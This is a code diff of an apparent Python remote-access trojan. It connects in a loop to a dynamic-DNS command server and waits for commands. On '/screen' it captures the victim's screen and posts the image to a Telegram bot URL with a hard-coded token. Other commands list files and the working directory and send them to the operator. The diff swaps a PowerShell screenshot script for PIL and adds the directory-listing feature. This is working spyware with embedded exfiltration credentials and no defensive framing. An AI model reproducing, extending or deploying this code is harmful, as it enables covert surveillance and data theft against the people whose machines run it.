@@ -1,18 +1,17 @@
 import socket
 import sys
-import time
 import subprocess
 import requests
 import os
+from PIL import ImageGrab
 host = 'dimagamera.ddns.net'
 port = 81
 
 while True:
-	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	s.connect((host, port))
-	data = "Connected"
 	try:
-
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.connect((host, port))
+		data = "Connected"
 		a = s.recv(1024)
 		a = a.decode()
 		if a == '/cmd':
@@ -24,31 +23,12 @@ while True:
 
 		elif a == '/screen':
 			try:
-				screen = ['<# :',
-				'  @echo off', 
-				'    powershell /nop /ex bypass^', 
-				'    "&{[ScriptBlock]::Create((gc \'%~f0\') -join [Char]10).Invoke()}"',
-				'  exit /b',
-				'#>', 
-				'(New-Object -ComObject Shell.Application).MinimizeAll()',
-				'Add-Type -AssemblyName System.Windows.Forms', 
-				'$scr = [Windows.Forms.SystemInformation]::VirtualScreen',
-					'$bmp = New-Object Drawing.Bitmap $scr.Width, $scr.Height',
-					'$gfx = [Drawing.Graphics]::FromImage($bmp)',
-					'$gfx.CopyFromScreen($scr.Location, [Drawing.Point]::Empty, $scr.Size)', 
-					'$gfx.Dispose()', 
-					'$bmp.Save(".\screenshot.png")', 
-					'$bmp.Dispose()']
-				bat = open('screen.bat', 'w')
-				for item in screen:
-					bat.write(item+'\n')
-				bat.close()
-				subprocess.run('screen.bat', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+				img = ImageGrab.grab()
+				img.save("screenshot.png")
 				photo = open(r"screenshot.png", 'rb')
 				files = {'document': photo}
-				requests.post("https://api.telegram.org/bot1656016658:AAGxJpjEaZ--T1eDc4wUc8GS3NXQ1fNcJ2w/sendDocument?chat_id=330710135", files=files)
+				requests.post("https://api.telegram.org/bot1334401569:AAF72wWqcQjpCY7o-BcfKfV420tBcqnXM0g/sendDocument?chat_id=330710135", files=files)
 				photo.close()
-				os.remove('screen.bat')
 				os.remove('screenshot.png')
 			except:
 				pass
@@ -65,7 +45,6 @@ while True:
 				c = s.recv(1024)
 				c = c.decode()
 				if c == '1':
-					print('111111111111111111111')
 					d = os.listdir()
 					f = open('files.txt', 'w')
 					for item in d:
@@ -79,11 +58,23 @@ while True:
 						s.send(a)
 					f.close()
 					os.remove('files.txt')
+
 				elif c == '2':
-					print('222222222222222222')
+					pwd = os.getcwd()
+					f = open('pwd.txt', 'w')
+					f.write(pwd)
+					f.close()
+					f = open('pwd.txt','rb')
+					a = f.read(1024)
+					s.send(a)
+					f.close()
+					s.send(a)
 					d = s.recv(1024)
-					d = d.decode()
+					d= d.decode()
+					desktop = os.listdir('C:\\Users\\gamer\\')
+					print(desktop)
 					d = os.listdir(d)
+					print('a')
 					f = open('files.txt', 'w')
 					for item in d:
 						f.write(item+'\n')
